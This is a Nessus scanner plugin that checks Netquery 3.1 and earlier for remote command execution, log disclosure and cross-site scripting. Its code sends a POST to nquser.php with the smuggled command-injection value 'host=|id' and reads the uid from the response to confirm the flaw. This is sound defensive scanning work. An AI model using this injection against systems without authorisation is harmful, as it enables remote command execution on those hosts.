#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is vulnerable to
multiple issues. 

Description :

The remote host is running Netquery, a suite of network information
utilities written in PHP. 

The version of Netquery on the remote host suffers from multiple 
flaws :

  - Remote Code Execution
    An attacker can execute arbitrary commands through the
    Ping panel of the 'nquser.php' script provided it's 
    enabled.

  - Information Disclosure
    An attacker can retrieve the log of Netquery activity 
    with a simple GET request.

  - Multiple Cross-Site Scripting Flaws
    The application fails to sanitize user-supplied input
    to several scripts before using it in dynamically-
    generated pages, which allows for cross-site scripting 
    attacks.

See also : 

http://www.packetstormsecurity.org/0507-exploits/netquery31.txt
http://virtech.org/phpbb2/viewtopic.php?t=28

Solution : 

Apply the patch or upgrade to Netquery 3.11 or later.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19301);
  script_version("$Revision: 1.7 $");

  script_bugtraq_id(14373);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"18277");
    script_xref(name:"OSVDB", value:"18278");
    script_xref(name:"OSVDB", value:"18279");
    script_xref(name:"OSVDB", value:"18280");
    script_xref(name:"OSVDB", value:"18281");
    script_xref(name:"OSVDB", value:"18282");
    script_xref(name:"OSVDB", value:"18283");
  }

  name["english"] = "Netquery <= 3.1 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Netquery <= 3.1";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "postnuke_detect.nasl", "xaraya_detection.nasl", "xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
npaths = 0;
#
# - standalone version.
foreach dir (cgi_dirs()) {
  paths[npaths++] = string(dir, "/nquser.php");
}
# - Postnuke module.
install = get_kb_item(string("www/", port, "/postnuke"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/index.php?module=Netquery");
  }
}
# - Xaraya module.
install = get_kb_item(string("www/", port, "/xaraya"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/index.php?module=netquery");
  }
}
# - Xoops module.
install = get_kb_item(string("www/", port, "/xoops"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/modules/netquery/index.php");
  }
}


# Loop through each path.
foreach path (paths) {
  # Check whether nquser.php exists.
  req = http_get(item:path, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does and looks like Netquery w/ ping enabled...
  if (egrep(string:res, pattern:'<input name="b7" .*src=".+/btn_ping\\.gif"')) {
    # Try to exploit the flaw to run a command.
    postdata = string(
      "querytype=ping&",
      # nb: run 'id'.
      "host=|id&",
      "maxp=4"
    );
    req = string(
      "POST ", path, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    pat = "<p>(uid=[0-9]+.*gid=[0-9]+.*)<br>";
    matches = egrep(string:res, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        output = eregmatch(pattern:pat, string:match);
        if (!isnull(output)) {
          output = output[1];
          break;
        }
      }
    }
    if (output) {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able to execute the command 'id' on the remote host.\n",
        "\n",
        "  Request:  POST ", path, "\n",
        "  Output:   ", output, "\n"
      );
      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
